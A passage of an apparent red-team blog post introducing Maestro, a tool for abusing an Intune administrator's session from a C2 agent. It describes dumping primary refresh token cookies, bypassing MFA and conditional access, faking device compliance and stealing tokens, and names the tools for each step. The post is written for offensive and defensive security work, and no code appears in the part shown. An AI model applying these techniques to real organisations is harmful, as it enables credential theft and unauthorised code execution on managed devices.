13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="ac65" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle"><strong class="al">Maestro: Abusing Intune for Lateral Movement Over C2</strong></h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a href="https://medium.com/@Mayyhem?source=post_page---byline--9ed71d38d546--------------------------------" rel="noopener follow"><div class="l ib ic by id ie"><div class="l fj"><img alt="Chris Thompson" class="l fd by dd de cx" src="https://miro.medium.com/v2/da:true/resize:fill:88:88/0*VB1kJkW5uCVpMaQ8" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div><div class="ih ab fj"><div><div class="bm" aria-hidden="false"><a href="https://posts.specterops.io/?source=post_page---byline--9ed71d38d546--------------------------------" rel="noopener  ugc nofollow"><div class="l ii ij by id ik"><div class="l fj"><img alt="Posts By SpecterOps Team Members" class="l fd by br il cx" src="https://miro.medium.com/v2/resize:fill:48:48/1*D-FDlfkqivRBQZoESrwtqw.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"/><div class="if by l br il fs n ig ft"></div></div></div></a></div></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="im ab q"><div class="ab q in"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b io ip bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" data-testid="authorName" href="https://medium.com/@Mayyhem?source=post_page---byline--9ed71d38d546--------------------------------" rel="noopener follow">Chris Thompson</a></p></div></div></div><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b io ip du"><span><a class="it iu ah ai aj ak al am an ao ap aq ar ex iv iw" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1cf7ed8b7054&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=post_page-1cf7ed8b7054--byline--9ed71d38d546---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l ix"><span class="bf b bg z du"><div class="ab cn iy iz ja"><div class="jb jc ab"><div class="bf b bg z du ab jd"><span class="je l ix">Published in</span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" data-testid="publicationName" href="https://posts.specterops.io/?source=post_page---byline--9ed71d38d546--------------------------------" rel="noopener  ugc nofollow"><p class="bf b bg z jf jg jh ji jj jk jl jm bk">Posts By SpecterOps Team Members</p></a></div></div></div><div class="h k"><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span></div></div><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">11 min read</span><div class="jn jo l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Oct 31, 2024</span></div></span></div></span></div></div></div><div class="ab cp jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke"><div class="h k w fg fh q"><div class="ku l"><div class="ab q kv kw"><div class="pw-multi-vote-icon fj je kx ky kz"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2F9ed71d38d546&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;user=Chris+Thompson&amp;userId=1cf7ed8b7054&amp;source=---header_actions--9ed71d38d546---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="la ao lb lc ld le am lf lg lh kz"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l li lj lk ll lm ln lo"><p class="bf b dv z du"><span class="lp">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao la lq lr ab q fk ls lt" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lu"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kf kg kh ki kj kk kl km kn ko kp kq kr ks kt"><div class="lv k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F9ed71d38d546&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=---header_actions--9ed71d38d546---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lw" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lx cn"><div class="l ae"><div class="ab cb"><div class="ly lz ma mb mc md ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al me an ao ap ex mf mg lt mh mi mj mk ml s mm mn mo mp mq mr ms u mt mu mv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="1d7a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">If I have a command and control (C2) agent on an Intune admin’s workstation, I should just be able to use their privileges to execute a script or application on an Intune-enrolled device, right?</p><p id="f24c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Not so fast.</p><h1 id="6339" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">I Wanna Go Fast!</h1><ul class=""><li id="52ca" class="mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt ox oy oz bk"><a class="af pa" href="https://github.com/Mayyhem/Maestro" rel="noopener ugc nofollow" target="_blank">Take me to the GitHub repo!</a></li><li id="7f47" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk"><a class="af pa" rel="noopener ugc nofollow" target="_blank" href="/maestro-9ed71d38d546#3530">Take me to the attack path walkthrough!</a></li><li id="fd7e" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk"><a class="af pa" rel="noopener ugc nofollow" target="_blank" href="/maestro-9ed71d38d546#66a5">Take me to the defensive guidance!</a></li></ul><h1 id="cd71" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">The Problem</h1><p id="523e" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">We often find ourselves in the context of a cloud administrator when following attack paths to objectives that require privileged access to Azure-hosted services. We want to use their Entra ID account’s privileges to execute actions in Azure, for example running arbitrary code on remote Intune devices (a.k.a. <a class="af pa" rel="noopener ugc nofollow" target="_blank" href="/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d">the “Death from Above” attack path</a> detailed by <a class="af pa" href="https://x.com/_wald0" rel="noopener ugc nofollow" target="_blank">Andy Robbins</a>), but we have some hurdles to overcome to accomplish this from a C2 agent:</p><ul class=""><li id="cf76" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt ox oy oz bk">We don’t have the user’s cleartext password</li><li id="82a8" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">Conditional access policies (CAPs) require multi-factor authentication (MFA) for access to the Intune Portal and/or a compliant, hybrid-joined device on a trusted network</li><li id="b625" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">We need to maintain stealth</li><li id="b122" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">We don’t have the knowledge, time, or patience to manipulate tokens and navigate the Azure portal or multiple tools</li></ul><p id="5427" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Let’s look at these problems one at a time and discuss the options available to us.</p><p id="e6cf" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">No Cleartext Credentials / MFA Required</strong></p><p id="f322" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">No password? No problem. We already <a class="af pa" href="https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/Askcreds" rel="noopener ugc nofollow" target="_blank">asked the admin nicely for their creds</a> and they didn’t bite, and their password hygiene on the host is solid, but if the device has an identity in Entra ID, we can dump <a class="af pa" href="https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token" rel="noopener ugc nofollow" target="_blank">primary refresh token</a> (PRT) cookies from the machine with tools like <a class="af pa" href="https://x.com/tifkin_" rel="noopener ugc nofollow" target="_blank">Lee Chagolla-Christensen</a>’s <a class="af pa" href="https://github.com/leechristensen/RequestAADRefreshToken" rel="noopener ugc nofollow" target="_blank">RequestAADRefreshToken</a>, <a class="af pa" href="https://x.com/_dirkjan" rel="noopener ugc nofollow" target="_blank">Dirk-jan Mollema</a>’s <a class="af pa" href="https://github.com/dirkjanm/ROADtoken" rel="noopener ugc nofollow" target="_blank">ROADToken</a>, <a class="af pa" href="https://x.com/mcbroom_evan" rel="noopener ugc nofollow" target="_blank">Evan McBroom</a>’s <a class="af pa" href="https://github.com/EvanMcBroom/lsa-whisperer" rel="noopener ugc nofollow" target="_blank">LSA Whisperer</a>, <a class="af pa" href="https://x.com/hotnops" rel="noopener ugc nofollow" target="_blank">Daniel Heinsen</a>’s, <a class="af pa" href="https://github.com/hotnops/SharpGetEntraToken" rel="noopener ugc nofollow" target="_blank">SharpGetEntraToken</a>, or <a class="af pa" href="https://github.com/wotwot563/aad_prt_bof" rel="noopener ugc nofollow" target="_blank">aad_prt_bof</a> by <a class="af pa" href="https://github.com/wotwot563" rel="noopener ugc nofollow" target="_blank">wotwot563</a>. These PRT cookies will even have an MFA claim if Windows Hello for Business (WHfB) was used for logon, allowing us to comply with MFA requirements enforced by CAPs or the <a class="af pa" href="https://azure.microsoft.com/en-us/blog/announcing-mandatory-multi-factor-authentication-for-azure-sign-in/" rel="noopener ugc nofollow" target="_blank">new default security policy for Azure sign-in</a>.</p><p id="369e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Stealth</strong></p><p id="6b01" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">We want to only execute tools that are code-signed and legitimately used in the environment, otherwise keep tool execution within our current process or proxied into the environment from a machine we control that isn’t subject to the organization’s security stack.</p><p id="2efc" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">We could use our shiny new PRT cookie to interact with Azure using a web browser proxied through the administrator’s workstation, but:</p><ul class=""><li id="46bf" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt ox oy oz bk">fumbling through the portal requires prior experience or time to figure out, and features are added, removed, or moved all the time</li><li id="71b8" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">information made available by the Azure APIs we’re interested in is not always displayed to the user or is difficult to find</li><li id="a2e3" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">we have to take frequent screenshots and manual activity logs for deconfliction and reporting instead of letting our C2 framework handle all that, gross</li><li id="6d0a" class="mw mx gu my b mz pb nb nc nd pc nf ng nh pd nj nk nl pe nn no np pf nr ns nt ox oy oz bk">we may still hit CAPs preventing access without a compliant and/or hybrid-joined device</li></ul><p id="0ffa" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">We could use our C2 agent to run command line tools that are likely to be already installed on cloud administrator workstations (e.g., PowerShell’s Invoke-RestMethod, <a class="af pa" href="https://github.com/microsoft/mggraph-intune-samples" rel="noopener ugc nofollow" target="_blank">Microsoft.Graph</a>, <a class="af pa" href="https://www.powershellgallery.com/packages/azuread/" rel="noopener ugc nofollow" target="_blank">AzureAD</a>, or <a class="af pa" href="https://github.com/microsoft/Intune-PowerShell-SDK" rel="noopener ugc nofollow" target="_blank">Intune</a> modules, curl.exe, etc.) and interact with Azure APIs, but they don’t directly support BYO PRT cookies, they require multiple steps to obtain refresh and access tokens after dumping a PRT cookie (let alone execute actions with those tokens), and they may generate suspicious parent/child process relationships and command line arguments.</p><p id="c012" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">We could dump refresh or access tokens from the memory of applications the cloud admin has used to authenticate to Entra ID (e.g., their browser, the ConfigMgr console in co-management setups, etc.) with tools like the <a class="af pa" href="https://github.com/trustedsec/CS-Remote-OPs-BOF" rel="noopener ugc nofollow" target="_blank">office_tokens BOF</a> from TrustedSec, but we need some luck to obtain creds with the correct client ID, scope, and resource for the actions we want to take or that can be <a class="af pa" href="https://github.com/secureworks/family-of-client-ids-research" rel="noopener ugc nofollow" target="_blank">swapped for creds</a> that meet these requirements.</p><p id="4ce5" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Device Compliance / Hybrid-joined Device</strong></p><p id="9629" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">An appropriately scoped refresh or access token would enable us to proxy in excellent open-source tools like <a class="af pa" href="https://github.com/dirkjanm/ROADtools" rel="noopener ugc nofollow" target="_blank">ROADTools</a>, <a class="af pa" href="https://github.com/Gerenios/AADInternals" rel="noopener ugc nofollow" target="_blank">AADInternals</a>, <a class="af pa" href="https://github.com/BloodHoundAD/BARK" rel="noopener ugc nofollow" target="_blank">BARK</a>, <a class="af pa" href="https://github.com/BloodHoundAD/AzureHound" rel="noopener ugc nofollow" target="_blank">AzureHound</a>, <a class="af pa" href="https://github.com/rvrsh3ll/TokenTactics" rel="noopener ugc nofollow" target="_blank">TokenTactics</a>/<a class="af pa" href="https://github.com/f-bader/TokenTacticsV2" rel="noopener ugc nofollow" target="_blank">TokenTacticsV2</a>, or <a class="af pa" href="https://github.com/dafthack/GraphRunner" rel="noopener ugc nofollow" target="_blank">GraphRunner</a>, but we still may be blocked by CAPs requiring device compliance or a hybrid-joined device when exchanging refresh tokens for access tokens or by <a class="af pa" href="https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation" rel="noopener ugc nofollow" target="_blank">Continuous Access Evaluation</a> when trying to use stolen access tokens. Further, we need a solid understanding of token manipulation, which at least for me was confusing and not easy to learn without a lot of help, trial and error, and <a class="af pa" href="https://outsidersecurity.nl/training/" rel="noopener ugc nofollow" target="_blank">training</a> from Dirk-jan Mollema at Outsider Security.</p><p id="5002" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">While it’s possible to <a class="af pa" href="https://aadinternals.com/post/mdm/" rel="noopener ugc nofollow" target="_blank">fake device compliance with AADInternals</a> thanks to Dr. Nestori Syynimaa (<a class="af pa" href="https://x.com/DrAzureAD" rel="noopener ugc nofollow" target="_blank">@DrAzureAD</a>) and just a few days ago, Dirk-jan Mollema <a class="af pa" href="https://x.com/_dirkjan/status/1850891976322781482" rel="noopener ugc nofollow" target="_blank">posted a screenshot of a fake device</a> he created that satisfied ten device compliance requirements, these techniques are not guaranteed to work in all organizations. Device compliance may also be determined and reported to Intune by Microsoft Configuration Manager (formerly SCCM) if the device is co-managed, complicating this attack vector further.</p><p id="6fb3" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">It’s also possible to satisfy conditional access policies requiring a hybrid-joined/registered device by joining a rogue/fake device to Entra ID or by overwriting an existing one, but these techniques require credentials to execute and don’t necessarily allow us to enroll the device in Intune to achieve device compliance.</p><p id="2ab8" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">In any case, CAPs may prevent us from proxying in the tools needed to pull off these attacks or from using them off network, and executing PowerShell directly on the admin’s workstation is risky. I’d rather just use the Intune admin’s compliant hybrid-joined device to reach my objectives.</p><p id="1973" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Using the Azure Portal and Other Tools</strong></p><p id="f21c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Let’s say the problems above are all figured out or we luck out and stumble upon an access token with exactly the attributes we need and there are no CAPs preventing us from using it. We still need to figure out how to use the token to make the appropriate calls to the Microsoft Graph API to execute scripts, applications, and queries on Intune-enrolled devices, which is a complicated, multi-step process.</p><h1 id="2b3f" class="nu nv gu bf nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or bk">The Solution</h1><p id="e915" class="pw-post-body-paragraph mw mx gu my b mz os nb nc nd ot nf ng nh ou nj nk nl ov nn no np ow nr ns nt gn bk">These problems kept resurfacing and none of the available options were ideal for my use case, so I decided to write Maestro to automate them away.</p><figure class="pj pk pl pm pn po pg ph paragraph-image"><div class="pg ph pi"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 1100w, https://miro.medium.com/v2/resize:fit:680/format:webp/1*Q0HvFPk-PaFefT-lIZpQVw.png 680w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, 